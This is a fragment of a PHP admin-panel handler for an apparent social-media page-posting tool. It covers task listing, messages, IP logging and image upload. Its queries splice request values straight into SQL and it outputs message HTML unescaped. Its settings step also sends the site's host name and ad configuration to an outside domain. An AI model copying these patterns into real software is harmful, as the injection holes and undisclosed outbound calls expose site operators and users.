       }else if($_GET['step'] == 'Dpost'){
       if(Ls('admin')){
       $idp= isv('id');
         $S = Sel('task',' where id='.$idp);
         UpDate('task','gr',1,' where id='.$idp);
         UpDate('task','share',4,' where id='.$idp);
         $Nusers = Num('task_msg',' where send="1" and post_id='.$idp);
           $idt=SqlIn('task',array('postid'=>$idp,'type'=>'delete','tp'=>$S->tp,'isshare'=>0,'time'=>time(),'count'=>$Nusers,'idu'=>0));
           if($idt){
                 echo json_encode( array('st'=>'success','msg'=>'تم الامر بنجاح'));

           }else{
                 echo json_encode( array('st'=>'error','msg'=>'حدث خطأ ما '));
           }

            }else{
                 echo json_encode( array('st'=>'error','msg'=>'عذرا لاتمتلك التصريح للقيام بذلك'));
           }

       }else if($_GET['step'] == 'Gshare'){

$id = isv('id');
if(isset($_GET['app'])){
$app = $_GET['app'];
}else{$app = isv('app');}
function mr($id,$app){
         if($app == "nshare"){ $where = 'where share !="0" and id <'.$id.' and type !="tfb" and type !="ttw"';}else{
         $where = 'where share !="0" and id <'.$id.' and  type ="tfb" or type ="ttw" ';
         }
return $where;
}
if(!$id and !$app){
         $limit= 10;
         $tp ='task';
         $where = 'where share="0"';
     }else if($id){
         $limit = 4 - Num("task",'where share ="0" ');
         $tp ='task';
         if(!$app){ $app = "nshare";}
        $where  = mr($id,$app);
     }else if($app == "nshare"){
         $limit = 8 - Num("task",'where share ="0"');
         $tp ='task';
         $where = 'where share !="0" and type !="tfb" and type !="ttw" ';
     }else if($app == "tshare"){
         $limit = 8 - Num("task",'where share ="0" ');
         $tp ='task';
         $where = 'where share !="0" and type ="tfb"';
     }
        $SPost= getUser($tp," $where ORDER BY id DESC limit $limit");

                            if($SPost){
                           for($i=0;$i<count($SPost);$i++){
                               $Sb = $SPost[$i];
                               $tutorial_id = $Sb["id"];

                            $S= Sel('posts','where id='.$Sb['postid']);
                            $Snum= Num('task',mr($tutorial_id,$app));
                             $count = $Sb['count'];
                           if(!empty($Sb['send'])) {$send= $Sb['send'];}else{$send=0;}
                           if(!empty($Sb['nosend'])) {$nsend= $Sb['nosend'];}else{$nsend=0;}

                           ?>

			<div class="col s12 m3 right" id="t<?=$Sb['id']?>" style="direction: rtl;">


    <ul class="collection with-header">
     <li class="collection-item text-right"><?=cptime($Sb['time'])?></li>
                                                <li class="collection-item center truncate"><?=lang($lg,'ttype_post')?> : <?=lang($lg,$Sb['type'])?></li>
                                                <li class="collection-item center truncate  <?php if($Sb['type'] =='token' or $Sb['type'] =='nof' or $Sb['type'] =='delete'){ ?> tdes <?php } ?>"><?=lang($lg,'type_post')?> : <?=Ginfo($lg,$S->type)?></li>
                                                <li class="collection-item center truncate"><?=lang($lg,'count')?> : <?=$count?></li>
                                                 <li class="collection-item center truncate"><?=lang($lg,'success')?> : <span class="green-text"><?=$send?></span></li>
                                                <li class="collection-item center truncate"><?=lang($lg,'error')?> : <span class="red-text"><?=$nsend?></span></li>
                                               <li class="collection-item center truncate"><?=Sshare($lg,$Sb['share'])?>  <?php if($S->type == 2 or $S->type == 7 or $S->type == 8){ ?> / النقرات : <?=$S->click?>  <?php  } if($Sb['type']=='tfb' and $St->cron == 2 and !empty($Sb['tp'])){echo" / الوقت :".$Sb['tp'];  } ?></li>
                                                <li class="collection-item center" style="font-size: 13px;">


                                                      <a  class="waves-effect waves-light tooltipped" data-position="bottom" data-delay="50" data-tooltip="حذف" onclick="re(<?=$Sb['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-times fa-lg" aria-hidden="true"></i></a>

        <?php if($Sb['type'] !='token' and $Sb['type'] !='nof' and $Sb['type'] !='tw' and $Sb['type'] !='delete'){ ?>
              <a  class="waves-effect waves-light tooltipped" data-position="bottom" data-delay="50" data-tooltip="تعديل" onclick="E_post(<?=$Sb['postid']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-eye fa-lg" aria-hidden="true"></i></a>
                                                      <a  class="waves-effect waves-light  tooltipped" data-position="bottom" data-delay="50" data-tooltip="حذف  من صفحات المستخدمين" onclick="Dpost(<?=$Sb['id']?>,'<?=$Gtype?>')" id="<?=$Sb['id']?>" ><i class="fa fa-trash-o fa-lg" aria-hidden="true"></i></a>

                                                 <?php }
                                                 if($Sb['type'] !='nof'){  $idp =$Sb['id']; }else {$idp =$Sb['id'];}
                                                 if(Num('task_msg','where post_id='.$idp)){
                                                      ?>

                                                <a  class="waves-effect waves-light tooltipped" data-position="bottom" data-delay="50" data-tooltip="الاحصائيه" onclick="Sstatus(<?=$idp?>)" id="<?=$Sb['id']?>" ><i class="fa fa-line-chart fa-lg" aria-hidden="true"></i></a>
                                                                 <?php  }   ?>
                                          <?php if($Sb['share'] == 0){ ?>
                                               <a  class="waves-effect waves-light tooltipped" data-position="bottom" data-delay="50" data-tooltip="متابعه النشر" onclick="Ref_post(<?=$Sb['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-refresh fa-lg" aria-hidden="true"></i></a>
                                                                                         <a  class="waves-effect waves-light tooltipped" data-position="bottom" data-delay="50" data-tooltip="ايقاف النشر" onclick="stop_task(<?=$Sb['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-hand-paper-o fa-lg" aria-hidden="true"></i></a>

                                           <?php  }else if($Sb['share'] == 4 or $Sb['share'] == 2){   ?>

                                             <a  class="waves-effect waves-light tooltipped" data-position="bottom" data-delay="50" data-tooltip="متابعه النشر" onclick="Ref_post(<?=$Sb['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-refresh fa-lg" aria-hidden="true"></i></a>

                                           <?php  }?>

                                                 </li>
                                              </ul>


      </div>
<?php } if($id or $app){ echo more($tutorial_id,$Snum,4); }  }
  }else if($_GET['step'] == 'cantry'){
  if(isset($_POST['n_cantry']) or isset($_POST['c_cantry']) or isset($_GET['cantry'])){
  $ccCode = countreCode();
                             for($i=0;$i<count($ccCode);$i++){
                             $c = strtolower($ccCode[$i]);
                             $ce = $ccCode[$i];
                             if(Num($appsql,' where cantry="'.$ce.'"') > 0){
                                      if(isset($_GET['cantry'])){
                                          ?>
                                  <option value='<?=$ce?>' ><?=getCName($c)?>(<?=Num($appsql,' where cantry="'.$ce.'"')?>)</option>
                                     <?php
                                                        }else{
                           $cen .= ','.getCName($c).'('.Num($appsql,' where cantry="'.$ce.'"').')'; $cee .= ','.$ce; }  } }
  if(!isset($_GET['cantry'])){
   echo json_encode( array('st'=>'error','cen'=>$cen,'cee'=>$cee,'cantry'=>$cantry));
                     }
   }else{
       header("Location: ../");
   }


  }else if($_GET['step'] == 'uonline'){
   if(Ftable('user_online') > 0 and 1 == 2){
if(isv('count',1)){
    ?>
<?=Num('user_online')?>
<?php
}else if(!isv('online',1)){
  $link =  isv('link',1);
  //$title = get_url($link)['title'];
  $title = str_replace("'",'"',base64_decode(isv('title',1)));
  $title = "";
  $cantry = "";

  //$system = getOS();
  $system = isv('system',1);
  $ip =  ip();
  //$cantry=visitor_country();
    $time_check=$time-(60*60);
    $time_check=$time-5;
    $tbl_name="user_online"; // Table name
if(Ftable($tbl_name)){
   $sql="SELECT * FROM $tbl_name WHERE session='$session'";
$result=mysqli_query($DBcon,$sql);

$count=mysqli_num_rows($result);
if($count=="0"){

$sql1="INSERT INTO $tbl_name(session, time,link,ip,cantry,title,system)VALUES('$session', '$time', '$link','$ip','$cantry','$title','$system')";
$result1=mysqli_query($DBcon,$sql1);
}

else {
"$sql2=UPDATE $tbl_name SET time='$time' WHERE session = '$session'";
$result2=mysqli_query($DBcon,$sql2);
}

$sql3="SELECT * FROM $tbl_name";
$result3=mysqli_query($DBcon,$sql3);
$count_user_online=mysqli_num_rows($result3);
$lbtn = ' href=\'javascript:void(window.open("'.$St->url.'/online.html","","width=525,height=550,left=0,top=0,resizable=yes,menubar=no,location=no,status=yes,scrollbars=yes"))\'';
echo "<a  ".$lbtn." >$count_user_online :  المتواجدين الان</a>";

// if over 10 minute, delete session
$sql4="DELETE FROM $tbl_name WHERE time<$time_check";
$result4=mysqli_query($DBcon,$sql4);
}
}else if(isv('online',1)){
?>
 <table class="bordered">
        <tbody>
<?php
$on = getUser('user_online');
if($on){
  for($i=0;$i<count($on);$i++){
     $Sb = $on[$i];
    $title = get_url($Sb['link'],1)['title'];
    //$title = $Sb['title'];
    $c = strtolower(visitor_country($Sb['ip']));

    if($Sb['ip'] == ip()){
        $Sb['system'] = "You";
    }
  ?>
<tr><td colspan="3"><?=$title?></td></tr>
          <tr>
            <td><a href="<?=$Sb['link']?>" target="_blank"><?=$Sb['link']?></a></td>
            <td><?=str_replace(',','',limit_str(getCName($c),1,1))?> <img src="../assets/images/blank.gif" class="flag flag-<?=$c?>" alt="" /></td>
            <td><?=$Sb['system']?></td>
          </tr>
<?php } }  ?>

        </tbody>
      </table>

<?php
}
}  }else if($_GET['step'] == 'Gmsg'){
if($dir){
       $id= $_POST['id'];
       $Gapp= $_POST['Gapp'];
      if($id){
            $S = Selaa('msg','where id='.$id);
     if($Gapp !== 'admin'){
     if($S['admin'] == 1){
            UpDate("msg",'send',1,'where id='.$id);
               }
          }else{
     if($S['admin'] == 0){
            UpDate("msg",'send',1,'where id='.$id);
               }

          }
      $u = Sel($appsql,'where user_id='.$S["userid"]);
      ?>
<!--   <div class="card-title"><i class="fa fa-clock-o" aria-hidden="true"></i> <?=cptime($S->time)?></div>
  <div class="clear"></div>
-->
 <span class="card-title right"><?=cptime($S['time'])?></span>
 <span class="card-title right"><a href="<?=Fb($S["userid"])?>" target="_blank"><?php if($S["admin"] == 0){echo $u->name;}else{echo "ادمن التطبيق";} ?></a></span>
  <div class="clear"></div>

   <div class="card-content" style="    border-bottom: 2px dotted #4DB6AC;">
   <?=html_entity_decode(stripslashes(str_replace('\n','<br>',$S['msg'])));?>
</div>
      <?php
    $SPost = getUser('msg','where main='.$id);
   if($SPost){
         for($i=0;$i<count($SPost);$i++){
             $S = $SPost[$i];
$u = Sel('users','where user_id='.$S["userid"]);
     if($Gapp !== 'admin'){
if($S['admin'] == 1){
            UpDate("msg",'send',1,'where id='.$S['id']);
            }
        }else{
if($S['admin'] == 0){
            UpDate("msg",'send',1,'where id='.$S['id']);
            }

        }
 ?>
 <span class="card-title right"><?=cptime($S['time'])?></span>
 <span class="card-title right"><a href="<?=Fb($S["userid"])?>" target="_blank"><?php if($S["admin"] == 0){echo $u->name;}else{echo "ادمن التطبيق";} ?></a></span>
  <div class="clear"></div>

   <div class="card-content" style="    border-bottom: 2px dotted #4DB6AC;">
   <?=html_entity_decode(stripslashes(str_replace('\n','<br>',$S['msg'])));?>
   </div>
<?php } } }else{
        $showLimit=12;
        $tp ="msg";
         $SPost= getUser($tp,"where  main='0' and userid='".userid."'  LIMIT ".$showLimit);
         for($i=0;$i<count($SPost);$i++){
             $msg = $SPost[$i];
    ?>
        <a class="collection-item   <?=active($msg['id'],$_GET['id'])?>" href="<?=Umsg($msg['id'])?>" id='<?=$msg['id']?>' style="    margin-left: 3px;"> <div><span href="#!" class="secondary-content left"><?=cptime($msg['time'])?></span> <?=limit_str($msg['msg'],3)?></div></a>
   <?php } }

    }else{
     header("Location: ../");
     }

   }else if($_GET['step'] == 'Rapp'){
if(Ls('admin')){
$id = isv('id');
if(!$id){
  $sql=  mysqli_query($DBcon,"INSERT INTO users SELECT * FROM users2;");
}else{   $sql=  mysqli_query($DBcon,"INSERT INTO users2 SELECT * FROM users;"); }
if($sql){
     if(!$id){
     $sql= UpDate('settings',array('app_id'=>$St->app2_id,'app_key'=>$St->app2_key));
     $sql= UpDate('settings',array('app2'=>0,'app2sql'=>0,'app2_id'=>'','app2_key'=>''));
     }else{
     $sql= UpDate('settings',array('app2_id'=>$St->app_id,'app2_key'=>$St->app_key));
     $sql= UpDate('settings',array('app2'=>1,'app2sql'=>1,'app_id'=>'','app_key'=>''));
     }
        if($sql){
        echo json_encode( array('st'=>'success','msg'=>"تم الامر بنجاح"));
           }else{
            $msg= mysqli_error();
     if(!$id){
         SqlEmpty('users');
     }else{ SqlEmpty('users2'); }
       echo json_encode( array('st'=>'error','msg'=>$msg));
           }
 }else{
        echo json_encode( array('st'=>'error','msg'=>mysqli_error()));

 }
 }else{
        echo json_encode( array('st'=>'error','msg'=>"عذرا لاتمتلك تصريح لفعل ذلك"));

 }
   }else if($_GET['step'] == 'DeleteAll'){
    ?>
<div class="row center" >
<div class="col s12 m12 right" style="margin: 17px 0px 6px 0px;">
 <a style="    width: 100%;" onclick="nosend()" class="btn waves-effect waves-light">حذف المتوقفين<ppp class="left">(<?=Num($appsql,'where send="0"')?>)<ppp></a>
 </div>

<div class="col s12 m12" style="font-size: 18px;
    margin: 6px 0px 6px 0px;">
حذف كل المستخدمين
</div>
<div class="col s6 m6 right">
 <a style="    width: 100%;" onclick="DeleteAll('users')" class="btn waves-effect waves-light">الاساسى</a>
 </div>
 <div class="col s6 m6">
 <a style="    width: 100%;" onclick="DeleteAll('users2')" class="btn waves-effect waves-light">الاحتياطى</a>
 </div>
<?php if($St->app2 == 1){ ?>
<div class="col s12 m12" style="font-size: 18px;
    margin: 6px 0px 6px 0px;">
تحويل التطبيق الاحتياطى الى الاساسى
</div>
<div class="col s12 m12 right">
 <a style="    width: 100%;" onclick="Rapp()" class="btn waves-effect waves-light">تحويل</a>
 </div>
<?php }else { ?>
<div class="col s12 m12" style="font-size: 18px;
    margin: 6px 0px 6px 0px;">
تحويل التطبيق الاساسى  الى احتياطى
</div>
<div class="col s12 m12 right">
 <a style="    width: 100%;" onclick="Rapp(1)" class="btn waves-effect waves-light">تحويل</a>
 </div>
<?php } ?>
</div>
    <?php
   }else if($_GET['step'] == 'email'){
   $msg= Sel($appsql,'where user_id='.isv('id',1))->email;
   $c = "green-text";
   if($msg == ""){
     $msg = "لم يتم العثور على بريد للمستخدم";
   $c = "red-text";
   }

    echo '<div class="center '.$c.' " >'.$msg.'</div>';

   }else if($_GET['step'] == 'ip'){
   if(isv('set',1)){
           UpDate('settings','ip',isv('ip'));
           UpDate('settings','block',isv('block'));
           UpDate('settings','day',isv('day'));
           UpDate('settings','url_block',isv('url_block'));
           UpDate('settings','block_day',isv('block_day'));
           UpDate('settings','allow_day',isv('allow_day'));
           UpDate('settings','url_allow',isv('url_allow'));
           UpDate('settings','hits_url',isv('hits_url'));
           UpDate('settings','num',isv('num'));
           UpDate('settings','password',isv('Ls'));
           UpDate('settings','Rd',isv('Rd'));
           UpDate('settings','bloger_v_code',isv('bloger_v_code'));
           UpDate('settings','bloger_ad_code',isv('bloger_ad_code'));
           UpDate('settings','bloger_ad_count',isv('bloger_ad_count'));
           UpDate('settings','bloger_ad_sand',isv('bloger_ad_sand'));
           UpDate('settings','bloger_ad_red',isv('bloger_ad_red'));
           UpDate('settings','bloger_url',isv('bloger_url'));
           UpDate('settings','bloger_ad',isv('bloger_ad'));
           UpDate('settings','bloger_ads',isv('bloger_ads'));
           $C= explode(",",isv('Ladf'));
           //$htm = "<meta name='propeller' content='".isv('htm')."' />";
           $u = "";
           if($C[0] != ""){
           $u = "http://go.deliverymodo.com/afu.php?id=".$C[0];
           }
          json("http://mohtasmbelah.com/user.php?set=vid,referl,Sadf,Ladf,Uadf,Madf,htm&val=".isv('vid').",".isv('referl').",".isv('Sadf').",".$u.",".$C[1].",".$C[2].",".isv('htm')."&get=".$Port.$_SERVER['HTTP_HOST']);
        $j =   json("http://mohtasmbelah.com/user.php?set=Nadf&val=".str_replace(",","$",isv("Nadf"))."&get=".$Port.$_SERVER['HTTP_HOST']);
            echo json_encode( array('st'=>'success','msg'=>"تم تحديث الزيارات بنجاح"));
   }else if(isv('remove',1)){
           Remove('ip',' where ip="'.isv('ip').'"');
            echo json_encode( array('st'=>'success','msg'=>"تم الحذف بنجاح"));
   }else{
   ?>
   <div class="row center"  dir="rtl"  >
   <div class="col m4 s12 right">الاجمالى (<?=Num('ip')?>)</div>
   <div class="col m2 s3"> اليوم (<?=Numday('ip')?>)</div>
   <div class="col m2 s3"> البارحه (<?=Numday('ip',"yesterday")?>)</div>
   <div class="col m2 s3">غير مكرر (<?=Num('ip','where  num <="'.$St->num.'"')?>)</div>
   <div class="col m2 s3"> مكرر (<?=Num('ip','where  num >"'.$St->num.'"')?>)</div>
            </div>

     						<table class="table striped" style="width:100%;text-align: center">
                            <tr>
                            <td>الاى بى </td>
                            <td>عدد مرات الدخول</td>
                            <td>حذف</td>
							</tr>
<?php $p = Selaa('ip','where ip="'.ip().'"'); if($p){  ?>
                            <tr>
                            <td><?=$p['ip']?></td>
                            <td><?=$p['num']?></td>
                            <td><a onclick="Rip('<?=$p['ip']?>')" >من هنا</a></td>
							</tr>

<?php
}
   $u = getUser('ip',' order by num desc');
   for($i=0;$i<count($u);$i++){
       $p = $u[$i];
?>
                            <tr>
                            <td><?=$p['ip']?></td>
                            <td><?=$p['num']?></td>
                            <td><a onclick="Rip('<?=$p['ip']?>')" >من هنا</a></td>
							</tr>

<?php
   }
?>

</table>
<?php

 }  }else if($_GET['step'] == 'GetGP'){
          $GB = isv("GP",1);
          $limit ="";
          if($GB == "groups"){  $limit = "limit 48";  }
         $uid = Sion('id');
        $user = getUser($GB,' where uid="'.$uid.'" order by rand() '.$limit);
       if($user){
        ?>
         <div class="col  s12 m12   center-align" style="direction: rtl;margin-bottom: 5px;">
         ( <?=count($user)?> )
         </div>
         <div class="col  s12 m12   center-align" style="margin-bottom: 5px;">
         <a style="cursor: pointer;"  class="zselectall" onclick="Sel('all')" >تحديد الكل </a> | <a style="cursor: pointer;" onclick="Sel('un')" class="zunselectall">الغاء المحدد</a>
         </div>
<?php if($GB == "groups"){  ?>
     <div class="col s12">
    <select class="browser-default" style="direction: rtl;margin-bottom: 15px;" name="time">
      <option value="60"  selected>حدد الفاصل الزمنى بين كل منشور</option>

  <?php $xx = 0;   for($y=0;$y <= 4;$y++){ $xx += 60;   ?>
      <option value="<?=$xx?>"><?=$xx?> ثانيه</option>
    <?php } ?>
    </select>
    <!--<label>الفاصل الزمنى بين كل منشور</label>-->
  </div>
        <?php
        }
         for($i=0;$i < count($user);$i++){
             $u = $user[$i];
        ?>            <div class="center-align item "  onclick="Sel(null,<?=$u['id']?>)" id="<?=$u['id']?>" style="cursor: pointer;opacity: 0.5;    position: relative;" >

               <img src="<?=FbImg($u['pid'])?>"   style="height: 57px;width: 60px;" width="60" height="60" class="circle hoverable responsive-img z-depth-1 tooltipped" alt=""   data-position="top" data-tooltip="<?=$u['name']?>" data-tooltip-id="ed472c81-cc4c-1ce6-956d-2ac9b8acd67b">
      </div>
<?php $cee .=','.$u['id'];   } }else{   echo Amsg('لم يتم العثور على صفحات','red');  }  ?>

<input type="hidden" name="time" />
<input type="hidden" name="Spages" />
<input type="hidden" name="Scall" value="<?=$cee?>" />
<script type="text/javascript">
 $('.tooltipped').tooltip({delay: 50});
</script>
<?php
 }else if($_GET['step'] == 'img'){

         $upload_dir = "../tmp/";
$upload_dir_url = $St->url."/tmp/";
$image_height = 300;
$image_width = 300;

//continue if $_POST is set and it is a Ajax request
if(isset($_POST) && isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest'){

	//makesure uploaded file is not empty
	if(!isset($_FILES['image_data']) || !is_uploaded_file($_FILES['image_data']['tmp_name'])){

				//generate a json response
				$response = json_encode(array(
											'type'=>'error',
											'msg'=>'Image file is Missing!'
										));
				die($response);
		}

	//gets image size info from a valid image file
	$image_size_info  = getimagesize($_FILES['image_data']['tmp_name']);

	//get mime type from valid image
    if($image_size_info){
        $image_type	= $image_size_info['mime']; //image type
    }else{
		$response = json_encode(array('type'=>'error', 'msg'=>'Invalid Image file !'));
		die($response);
    }

	//initiate ImageMagick
	$image = new Imagick($_FILES['image_data']['tmp_name']);

	if($image_type=="image/gif") //determine image format
	{
		//if it's GIF file, resize each frame
		$image = $image->coalesceImages();
		foreach ($image as $frame) {
	 		$frame->resizeImage( $image_height , $image_width , Imagick::FILTER_LANCZOS, 1, TRUE);
		}
		$image = $image->deconstructImages();
	}else{
		//otherwise just resize
		$image->resizeImage( $image_height , $image_width , Imagick::FILTER_LANCZOS, 1, TRUE);
	}
	//write image to a file
    $img = $_FILES['image_data']['name'];
    $img = time().'.png';
	$results = $image->writeImages($upload_dir.$img , true);

	//output success response
	if($results){
		$response = json_encode(array('type'=>'success','img'=>'tmp/'.$img, 'msg'=>'<img src="'.$upload_dir_url. $img.'">'));
		die($response);
	}

}

  }else{
       header("Location: ../");

  }
?>